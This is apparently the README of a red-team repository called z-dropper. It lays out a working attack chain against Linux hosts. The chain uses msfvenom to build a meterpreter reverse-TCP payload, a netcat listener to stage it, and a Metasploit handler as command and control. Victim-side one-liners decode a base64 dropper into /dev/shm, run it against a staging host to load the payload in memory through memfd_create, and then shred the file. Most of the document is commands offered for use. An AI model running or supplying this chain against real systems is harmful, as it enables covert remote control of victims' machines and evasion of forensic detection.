# z-dropper

## Purpose

This repository contains the collection of code execution building blocks and patterns useful during red team engagements.

## Backend (basic version)

Staging machine (ephemeral) serving stageless `mettle` payload:

```
staging$ msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<C2_IP> LPORT=443 --platform linux -f elf -a x64 -o beacon-mettle
staging$ nc -nlvp 443 < beacon-mettle
```

Meterpreter handler as our command and control (`C2`) machine:

```
c2$ cat > mettle-handler.rc <<'EOF'
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter_reverse_tcp
set LHOST <C2_IP>
set LPORT 443
set ExitOnSession false
exploit -j -z
EOF

c2$ msfconsole -r mettle-handler.rc
```

## Pattern 0

```
wget https://raw.githubusercontent.com/mzet-/z-dropper/main/z-dropper-case0.zig
```

## Pattern 1

Assumptions:

 - Red Team member has already achieved remote `/bin/sh` access to the victim machine.
 - Only `z-dropper` is dropped on the victim's filesystem (though only on `tmpfs`).
 - Main payload (stageless `mettle` binary in this case) is downloaded and executed using `memfd_create` syscall (directly from memory).

Preparing C version:

```
# Getting z-dropper source file:
wget https://raw.githubusercontent.com/mzet-/z-dropper/main/z-dropper-case1.c

# Compilation and base64 encoding:
EXE=z-dropper-case1; zig cc -static -Os -target x86_64-linux-musl ${EXE}.c -o $EXE; strip -x -R -s -g $EXE; echo; cat "$EXE" | base64 -w 0; echo; echo

# On the victim machine (where `<BASE64_ENCODED_BIN>` is taken from previous step):
echo -n '<BASE64_ENCODED_BIN>' | base64 -d >/dev/shm/s; chmod +x /dev/shm/s; /dev/shm/s <STAGING_IP> 443; shred -u -f -z /dev/shm/s
```

Preparing Zig version:

```
# Getting source file:
wget https://raw.githubusercontent.com/mzet-/z-dropper/main/z-dropper-case1.zig

# Compilation and base64 encoding:
EXE=z-dropper-case1; zig build-exe -OReleaseSmall --strip ${EXE}.zig; echo; cat "$EXE" | base64 -w 0; echo; echo

# On the victim machine (where `<BASE64_ENCODED_BIN>` is taken from previous step):
echo -n '<BASE64_ENCODED_BIN>' | base64 -d >/dev/shm/s; chmod +x /dev/shm/s; /dev/shm/s <STAGING_IP> 443; shred -u -f -z /dev/shm/s
```

## Pattern 2

Assumptions:

 - Red Team member has already achieved remote `/bin/sh` access to the victim machine.
 - Pure fileless execution (with the help of Python interpreter)
 - Python 3 interpreter is required on the victim machine. 
 - Payload (stageless `mettle` binary in this case) is downloaded and executed using `memfd_create` syscall using Python's `ctype` module.
